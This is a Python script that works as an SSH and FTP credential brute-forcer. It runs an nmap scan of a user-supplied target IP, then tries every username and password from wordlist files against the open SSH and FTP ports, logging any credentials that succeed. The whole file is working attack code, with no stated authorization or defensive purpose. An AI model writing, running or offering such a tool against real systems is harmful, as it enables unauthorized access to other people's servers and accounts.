import paramiko
import ftplib
import requests
import nmap
import telnetlib
import logging

# Configure logging
logging.basicConfig(filename="bruteforce_debug.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")


def scan_ports(ip):
    """Scan for open ports using nmap."""
    nm = nmap.PortScanner()
    print(f"Scanning for open ports on {ip}...")
    nm.scan(ip, '21-23,80', arguments='-Pn')
    open_ports = []
    for port in nm[ip]['tcp']:
        if nm[ip]['tcp'][port]['state'] == 'open':
            open_ports.append(port)
    return open_ports


def ssh_brute_force(ip, username, password):
    """Attempt SSH login."""
    try:
        print(f"Trying SSH - Username: {username}, Password: {password}")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=22, username=username, password=password, timeout=5)
        print(f"[+] SSH Success! Username: {username}, Password: {password}")
        logging.info(f"SSH Login Successful: Username={username}, Password={password}")
        client.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        logging.debug(f"SSH Authentication Failed: Username={username}, Password={password}")
    except Exception as e:
        logging.error(f"SSH Error: {e}")
    return False


def ftp_brute_force(ip, username, password):
    """Attempt FTP login."""
    try:
        print(f"Trying FTP - Username: {username}, Password: {password}")
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=5)
        ftp.login(user=username, passwd=password)
        print(f"[+] FTP Success! Username: {username}, Password: {password}")
        logging.info(f"FTP Login Successful: Username={username}, Password={password}")
        ftp.quit()
        return True
    except ftplib.error_perm:
        logging.debug(f"FTP Authentication Failed: Username={username}, Password={password}")
    except Exception as e:
        logging.error(f"FTP Error: {e}")
    return False


def brute_force(ip, usernames, passwords):
    """Perform brute force based on open ports."""
    open_ports = scan_ports(ip)
    print(f"Open Ports Found: {open_ports}")

    for port in open_ports:
        for username in usernames:
            for password in passwords:
                if port == 22:  # SSH
                    if ssh_brute_force(ip, username, password):
                        return
                elif port == 21:  # FTP
                    if ftp_brute_force(ip, username, password):
                        return
                else:
                    print(f"Port {port} brute force not implemented.")
    print("[-] No valid credentials found.")


if __name__ == "__main__":
    target_ip = input("Enter the target IP: ")

    # Load usernames and passwords from files
    with open("usernames.txt", "r") as uf:
        usernames = [line.strip() for line in uf.readlines()]
    with open("passwords.txt", "r") as pf:
        passwords = [line.strip() for line in pf.readlines()]

    # Start brute force
    brute_force(target_ip, usernames, passwords)
